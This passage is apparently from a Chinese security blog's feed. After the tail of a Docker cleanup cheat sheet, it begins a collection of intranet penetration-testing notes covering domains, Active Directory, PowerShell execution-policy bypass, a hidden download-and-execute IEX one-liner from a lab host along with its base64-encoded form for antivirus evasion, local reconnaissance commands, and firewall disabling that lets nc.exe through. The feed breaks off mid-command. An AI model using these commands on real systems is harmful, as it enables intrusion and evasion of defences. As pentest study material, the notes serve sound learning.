-q -f status&#x3D;exited)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有已停止的容器</p><pre class="line-numbers language-none"><code class="language-none">docker rm $(docker ps -a -q)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有正在运行和已停止的容器</p><pre class="line-numbers language-none"><code class="language-none">docker stop $(docker ps -a -q)docker rm $(docker ps -a -q)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有容器，没有任何标准</p><pre class="line-numbers language-none"><code class="language-none">docker container rm $(docker container ps -aq)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Docker 资源清理</p><pre class="line-numbers language-none"><code class="language-none">docker container prune# 删除所有退出状态的容器docker image prune# 删除 dangling 或所有未被使用的镜像docker network prune# 删除所有未使用的网络docker volume prune# 删除未被使用的数据卷docker system prune# 删除已停止的容器、dangling 镜像、未被容器引用的 network 和构建过程中的 cache，安全起见，这个命令默认不会删除那些未被任何容器引用的数据卷，如果需要同时删除这些数据卷，你需要显式的指定 --volumns 参数docker system prune --all --force --volumns # 这次不仅会删除数据卷，而且连确认的过程都没有了！注意，使用 --all 参数后会删除所有未被引用的镜像而不仅仅是 dangling 镜像<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>删除所有镜像</p><pre class="line-numbers language-none"><code class="language-none">docker rmi $(docker images -q)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、卸载Docker"><a href="#3、卸载Docker" class="headerlink" title="3、卸载Docker"></a>3、卸载Docker</h2><pre class="line-numbers language-none"><code class="language-none">yum list installed | grep dockeryum -y remove docker.x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4、卸载Docker-compose"><a href="#4、卸载Docker-compose" class="headerlink" title="4、卸载Docker-compose"></a>4、卸载Docker-compose</h2><pre class="line-numbers language-none"><code class="language-none">rm &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>参考地址：</p><p><a href="https://blog.csdn.net/a906998248/article/details/46236687">https://blog.csdn.net/a906998248/article/details/46236687</a></p><p><a href="https://blog.csdn.net/wesleyflagon/article/details/78961990">https://blog.csdn.net/wesleyflagon/article/details/78961990</a></p><p>原文链接：</p><p><a href="https://teamssix.com/211028-204606.html">https://teamssix.com/211028-204606.html</a></p><p>更多信息欢迎关注微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;平时在使用 Docker 时，经常会碰到忘记相关命令的情况，因此平时忘记一个就会记录一个，经过多年的</summary>
      
    
    
    
    <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    <category term="Docker" scheme="https://www.teamssix.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>【建议收藏】内网学习笔记合集</title>
    <link href="https://www.teamssix.com/211027-163641.html"/>
    <id>https://www.teamssix.com/211027-163641.html</id>
    <published>2021-10-27T08:36:41.000Z</published>
    <updated>2021-11-22T08:59:50.091Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>自 2020 年 11 月份至 2021 年 10 月份，在这近一年的时间里，笔者更新了自己在学习内网过程中的 30 余篇笔记，并将笔记同步更新到了自己的公众号、博客、CSDN 等平台，特在此整理成合集发布出来。</p><p>建议收藏本文，随时翻阅查看。</p><blockquote><p>本文首发在我的个人公众号和个人博客，欢迎关注我的公众号：TeamsSix，我的博客：<a href="https://teamssix.com/">teamssix.com</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p><h1 id="0x01-内网常见名词解释"><a href="#0x01-内网常见名词解释" class="headerlink" title="0x01 内网常见名词解释"></a>0x01 内网常见名词解释</h1><h2 id="1、工作组"><a href="#1、工作组" class="headerlink" title="1、工作组"></a>1、工作组</h2><p><strong>工作组</strong> <code>Work Group</code> 是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p><p>比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。</p><p>为了解决这一问题，Windows 9x/NT/2000 引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。</p><p>在工作组中所有的计算机都是平等的，没有管理与被管理之分，因此工作组网络也称为对等网络。</p><p>所以对于管理者而言，工作组的管理方式有时会不太便于管理，这时候就需要了解域的概念了。</p><h2 id="2、域"><a href="#2、域" class="headerlink" title="2、域"></a>2、域</h2><h3 id="域-Domain"><a href="#域-Domain" class="headerlink" title="域 Domain"></a>域 <code>Domain</code></h3><p> 可以简单的理解成工作组的升级版，如果说工作组是“免费旅店”那么域就是“星级宾馆”；工作组可以随便进进出出，而域则有严格的控制。</p><p>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器。</p><h3 id="域控制器-Domain-Controller"><a href="#域控制器-Domain-Controller" class="headerlink" title="域控制器 Domain Controller"></a>域控制器 <code>Domain Controller</code></h3><p>简写为 <code>DC</code>，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。</p><p>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。</p><p>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。</p><p>而要想实现域环境，就必须要计算机中安装活动目录，也可以说如果在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。在域中除了域控制器还有成员服务器、客户机、独立服务器。</p><h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>顾名思义，在一个域下新建了一个域便称其为子域。形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。每个域中都有独立的安全策略。</p><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。</p><p>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，如域child.Microsoft.com 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。</p><p>而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。</p><p>多个域树可以组成一个域林。</p><h3 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h3><p>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p><p>但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过Kerberos 信任关系建立起来，所以每个域树都知道Kerberos信任关系，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系.</p><p>比如benet.com.cn,则可以创建同属与一个林的accp.com.cn,他们就在同一个域林里.</p><p>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。</p><p>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/%E5%9F%9F%E6%9E%97.png" alt="域林"></p><h2 id="3、活动目录"><a href="#3、活动目录" class="headerlink" title="3、活动目录"></a>3、活动目录</h2><p><strong>活动目录</strong> <code>Active Directory</code> ，简写为 <code>AD</code>，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中。</p><p>目录包含了有关各种对象，例如用户、用户组、计算机、域、组织单位（OU）以及安全策略的信息。目录存储在域控上，并且可以被网络应用程序或者服务所访问。</p><p>活动目录就相当于内网中各种资源的一个目录，通过活动目录用户可以快速定位到这些资源的位置。</p><h2 id="4、DMZ"><a href="#4、DMZ" class="headerlink" title="4、DMZ"></a>4、DMZ</h2><p>DMZ <code>demilitarized zone</code> ，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。</p><p>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/f603918fa0ec08fadb43804a59ee3d6d54fbda98.jfif"></p><h2 id="5、域内的各种权限"><a href="#5、域内的各种权限" class="headerlink" title="5、域内的各种权限"></a>5、域内的各种权限</h2><p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。</p><p><strong>域本地组</strong></p><p>成员范围：所有的域；使用范围：自己所在的域</p><p><strong>全局组</strong></p><p>成员范围：自己所在的域；使用范围：所有的域</p><p><strong>通用组</strong></p><p>成员范围：所有的域；使用范围：所有的域</p><p><strong>A-G-DL-P 策略</strong></p><p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><ul><li>A 表示用户账号</li><li>G 表示全局组</li><li>U 表示通用组</li><li>DL 表示域本地组</li><li>P 表示资源权限</li></ul><h1 id="0x02-PowerShell"><a href="#0x02-PowerShell" class="headerlink" title="0x02 PowerShell"></a>0x02 PowerShell</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>PowerShell 可以简单的理解为 cmd 的高级版，cmd 能做的事在 PowerShell 中都能做，但 PowerShell 还能做很多 cmd 不能做的事情。</p><p>PowerShell 内置在 Windows 7、Windows Server 2008 R2 及更高版本的 Windows 系统中，同时 PowerShell 是构建在 .NET 平台上的，所有命令传递的都是 .NET 对象。</p><p>PowerShell 有如下特点：</p><ul><li>Windows 7 以上的操作系统默认安装</li><li>PowerShell 脚本可以运行在内存中，不需要写入磁盘</li><li>可以从另一个系统中下载 PowerShell 脚本并执行</li><li>目前很多工具都是基于 PowerShell 开发的</li><li>很多安全软件检测不到 PowerShell 的活动</li><li>cmd 通常会被阻止运行，但是 PowerShell 不会</li><li>可以用来管理活动目录</li></ul><p>可输入 Get-Host 或者 $PSVersionTable 查看 PowerShell 版本：</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; Get-HostName             : ConsoleHostVersion          : 5.1.18362.1171InstanceId       : a0a6f8f2-f86a-477f-bf4b-b94b452bee3cUI               : System.Management.Automation.Internal.Host.InternalHostUserInterfaceCurrentCulture   : zh-CNCurrentUICulture : zh-CNPrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxyDebuggerEnabled  : TrueIsRunspacePushed : FalseRunspace         : System.Management.Automation.Runspaces.LocalRunspace<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; $PSVersionTableName                           Value----                           -----PSVersion                      5.1.18362.1171PSEdition                      DesktopPSCompatibleVersions           &#123;1.0, 2.0, 3.0, 4.0...&#125;BuildVersion                   10.0.18362.1171CLRVersion                     4.0.30319.42000WSManStackVersion              3.0PSRemotingProtocolVersion      2.3SerializationVersion           1.1.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Windows 操作系统对应的 PowerShell 版本信息：</p><p>1.0        windows server 2008</p><p>2.0        windows server 2008 r2、windows 7</p><p>3.0        windows server 2012、windows 8</p><p>4.0        windows server 2012 r2、windows 8.1</p><p>5.0        windows 10</p><p>5.1        windows server 2016</p><h2 id="2、基本概念"><a href="#2、基本概念" class="headerlink" title="2、基本概念"></a>2、基本概念</h2><h3 id="ps1-文件"><a href="#ps1-文件" class="headerlink" title="ps1 文件"></a>ps1 文件</h3><p>ps1 是PowerShell 的脚本扩展名，一个 PowerShell 脚本文件其实就是一个简单的文本文件。</p><h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>为了防止恶意脚本在 PowerShell 中被运行，PowerShell 有个执行策略，默认情况下，这个执行策略是受限模式<code>Restricted</code>。</p><p>使用 <code>Get-ExecutionPolicy</code>命令查看当前执行策略</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; Get-ExecutionPolicyRestricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行策略有以下几种：</p><p><strong>Restricted</strong>：不能运行脚本</p><p><strong>RemoteSigned</strong>：本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）</p><p><strong>AllSigned</strong>：仅当脚本由受信任的发布者签名才能运行。 </p><p><strong>Unrestricted</strong>：脚本执行不受限制，不管来自哪里，也不管它们是否有签名。</p><p>使用<code>Set-ExecutionPolicy &lt;policy name&gt;</code>设置执行策略，该命令需要管理员权限</p><pre class="line-numbers language-none"><code class="language-none">PS C:\WINDOWS\system32&gt; Set-ExecutionPolicy Unrestricted执行策略更改执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170 中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): APS C:\WINDOWS\system32&gt; Get-ExecutionPolicyUnrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>PowerShell 运行脚本的方式和其他 shell 基本一致，可以输入完整路径运行，也可以到 ps1 文件所在目录下去运行，具体如下：</p> <pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; C:\t.ps1hello TeamsSixPS C:\Users\teamssix&gt; cd C:\PS C:\&gt; .\t.ps1hello TeamsSix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里不禁想吐槽一下，在看百度百科的时候关于 PowerShell 运行脚本的描述是这样的：“假设你要运行一个名为a.ps1的脚本，你可以键入 C:\Scripts\aps1，最大的例外是，如果 PowerShell 脚本文件刚好位于你的系统目录中，那么你可以直接在命令提示符命令提示符后键入脚本文件名即可运行”</p><p>这里的“系统目录”是指的啥目录？C:\还是C:\windows\system目录，“最大的例外”又是什么鬼，讲道理读起来有一种机翻的感觉。</p></blockquote><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>PowerShell 中的管道类似于 linux 中的管道，都是将前一个命令的输出作为另一个命令的输入，两个命令之间使用 “|” 进行连接。</p><p>例如，在 PowerShell 中获取进程信息并以程序 ID 进行排序</p><pre class="line-numbers language-none"><code class="language-none">PS C:\&gt; Get-Process | Sort-Object IDHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName-------  ------    -----      -----     ------     --  -- -----------      0       0       60          8                 0   0 Idle   3038       0      208       4760                 4   0 System      0      12     7732      81344                88   0 Registry     53       3     1160        752               368   0 smss    256      10     2468       7424               424   0 svchost    662      21     1788       4668               504   0 csrss    160      11     1364       5660               580   0 wininit    653      27    18592     177580               588   1 csrss   1219      67    59660         52       2.59    600   1 WinStore.App    278      14     3108      15656               684   1 winlogon    687      11     5420       9432               724   0 services<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、一些命令"><a href="#3、一些命令" class="headerlink" title="3、一些命令"></a>3、一些命令</h2><blockquote><p>-NoLogo：启动不显示版权标志的PowerShell</p><p>-WindowStyle Hidden (-W Hidden)：隐藏窗口</p><p>-NoProfile (-NoP)：不加载当前用户的配置文件</p><p>–Enc：执行 base64 编码后的 powershell 脚本字符串</p><p>-ExecutionPolicy Bypass (-Exec Bypass) ：绕过执行安全策略</p><p>-Noexit：执行后不退出Shell，这在使用键盘记录等脚本时非常重要</p><p>-NonInteractive (-Nonl)：非交互模式，PowerShell 不为用户提供交互的提示</p></blockquote><p>在 PowerShell 下，命令的命名规范很一致，都采用了动词-名词的形式，如 Net-Item，动词一般为 Add、New、Get、Remove、Set 等。PowerShell 还兼容 cmd 和 Linux 命令，如查看目录可以使用 dir 或者 ls 。</p><h3 id="文件操作类命令"><a href="#文件操作类命令" class="headerlink" title="文件操作类命令"></a>文件操作类命令</h3><pre class="line-numbers language-none"><code class="language-none">新建目录test：New-Item test -ItemType directory删除目录test：Remove-Item test新建文件test.txt：New-Item test.txt -ItemType file新建文件test.txt，内容为 hello：New-Item test.txt -ItemType file -value &quot;hello&quot;删除文件test.txt：Remove-Item test.txt查看文件test.txt内容：Get-Content  test.txt设置文件test.txt内容t：Set-Content  test.txt  -Value &quot;hello&quot;给文件test.txt追加内容：Add-Content test.txt  -Value &quot;,word!&quot;清除文件test.txt内容：Clear-Content test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="绕过本地权限并执行"><a href="#绕过本地权限并执行" class="headerlink" title="绕过本地权限并执行"></a>绕过本地权限并执行</h3><p>上面说到了默认情况下 PowerShell 的执行策略是受限模式<code>Restricted</code>，这就导致了在渗透测试过程中我们需要采用一些方法绕过这个策略，从而执行我们的脚本文件。</p><p>先来看看默认受限模式下执行脚本的情况</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; powerShell.exe Get-ExecutionPolicyRestrictedPS C:\Users\teamssix&gt; PowerShell.exe -File t.ps1无法加载文件 C:\Users\teamssix\t.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170 中的 about_Execution_Policies。    + CategoryInfo          : SecurityError: (:) []，ParentContainsErrorRecordException    + FullyQualifiedErrorId : UnauthorizedAccess<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里系统会提示在此系统上禁止运行脚本，但加上 <code>-ExecutionPolicy Bypass</code>即可绕过这个限制</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; cat .\t.ps1echo &quot;Hello TeamsSix&quot;PS C:\Users\teamssix&gt; PowerShell.exe -ExecutionPolicy Bypass -File t.ps1hello TeamsSix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="绕过本地权限并隐藏执行"><a href="#绕过本地权限并隐藏执行" class="headerlink" title="绕过本地权限并隐藏执行"></a>绕过本地权限并隐藏执行</h3><p>加入<code>-WindowStyle Hidden -NoLogo -NonInteractive -NoProfile</code> 即可隐藏执行。</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File t.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="下载远程脚本绕过权限并隐藏执行"><a href="#下载远程脚本绕过权限并隐藏执行" class="headerlink" title="下载远程脚本绕过权限并隐藏执行"></a>下载远程脚本绕过权限并隐藏执行</h3><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;172.16.214.1:8000&#x2F;t.ps1&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者简写</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -W Hidden -NoLogo -NonI -NoP &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;172.16.214.1:8000&#x2F;t.ps1&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="利用-Base64-对命令进行编码"><a href="#利用-Base64-对命令进行编码" class="headerlink" title="利用 Base64 对命令进行编码"></a>利用 Base64 对命令进行编码</h3><p>使用 Base64 进行编码主要是为了混淆代码以避免被杀毒软件查杀，经过尝试这里直接使用 Base64 编码是不行的，可以使用 Github 上的一个编码工具，工具下载地址：</p><p><a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py">https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py</a></p><p>下载好后，需要先将要执行的命令保存到文本文件中，这里保存到了 tmp.txt 文本中，之后执行 <code>python ps_encoder.py -s tmp.txt</code> 即可</p><pre class="line-numbers language-none"><code class="language-none">&gt;cat tmp.txtIEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;172.16.214.1:8000&#x2F;t.ps1&#39;)&gt;python ps_encoder.py -s tmp.txtSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 –Enc 指定 Base64 编码内容</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-06_18-40-25.png"></p><h1 id="0x03-本地工作组信息收集"><a href="#0x03-本地工作组信息收集" class="headerlink" title="0x03 本地工作组信息收集"></a>0x03 本地工作组信息收集</h1><h2 id="1、手动收集本地工作组信息"><a href="#1、手动收集本地工作组信息" class="headerlink" title="1、手动收集本地工作组信息"></a>1、手动收集本地工作组信息</h2><ul><li>查看当前权限</li></ul><pre class="line-numbers language-none"><code class="language-none">whoami <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>本机网络配置信息</li></ul><pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>操作系统和版本信息（英文版）</li></ul><pre class="line-numbers language-none"><code class="language-none">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>操作系统和版本信息（中文版）</li></ul><pre class="line-numbers language-none"><code class="language-none">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看系统体系结构</li></ul><pre class="line-numbers language-none"><code class="language-none">echo %PROCESSOR_ARCHITECTURE%<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看系统所有环境变量</li></ul><pre class="line-numbers language-none"><code class="language-none">set<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看安装的软件及版本和路径等信息</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic product get name,version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>利用 PowerShell 收集软件版本信息</li></ul><pre class="line-numbers language-none"><code class="language-none">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查询本机服务信息</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic service list brief<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查询进程列表</li></ul><pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>wmic 查看进程信息</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic process list brief<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看启动程序信息</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic startup get command,caption<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看计划任务</li></ul><pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看主机开启时间</li></ul><pre class="line-numbers language-none"><code class="language-none">net statistics workstation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查询用户列表</li></ul><pre class="line-numbers language-none"><code class="language-none">net user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li> 查看指定用户的信息</li></ul><pre class="line-numbers language-none"><code class="language-none">net user teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li> 查看本地管理员用户</li></ul><pre class="line-numbers language-none"><code class="language-none">net localgroup administrators<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看当前在线用户</li></ul><pre class="line-numbers language-none"><code class="language-none">query user || qwinsta<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>列出或断开本地计算机和连接的客户端的会话 </li></ul><pre class="line-numbers language-none"><code class="language-none">net session<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看端口列表</li></ul><pre class="line-numbers language-none"><code class="language-none">netstat –ano<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看补丁列表</li></ul><pre class="line-numbers language-none"><code class="language-none">systeminfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用 wmic 查看补丁列表</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic qfe get Caption,Description,HotFixID,InstalledOn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看本机共享</li></ul><pre class="line-numbers language-none"><code class="language-none">net share<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用 wmic 查看共享列表</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic share get name,path,status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查询路由表及所有可用接口的ARP 缓存表 </li></ul><pre class="line-numbers language-none"><code class="language-none">route printarp –a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>查询防火墙相关配置 </p><ul><li>关闭防火墙</li></ul><pre class="line-numbers language-none"><code class="language-none">netsh firewall set opmode disable (Windows Server 2003 系统及之前版本)netsh advfirewall set allprofiles state off(Windows Server 2003 系统之后版本)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看防火墙配置</li></ul><pre class="line-numbers language-none"><code class="language-none">netsh firewall show config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>修改防火墙配置</li></ul><pre class="line-numbers language-none"><code class="language-none">(Windows Server 2003 系统及之前版本)允许指定程序全部连接netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable(Windows Server 2003 之后系统版本)允许指定程序连入netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;C: \nc.exe&quot;允许指定程序连出netsh advfirewall firewall add rule name&#x3D;&quot;Allow nc&quot; dir&#x3D;out action&#x3D;allow program&#x3D;&quot;C: \nc.exe&quot;允许 3389 端口放行netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP 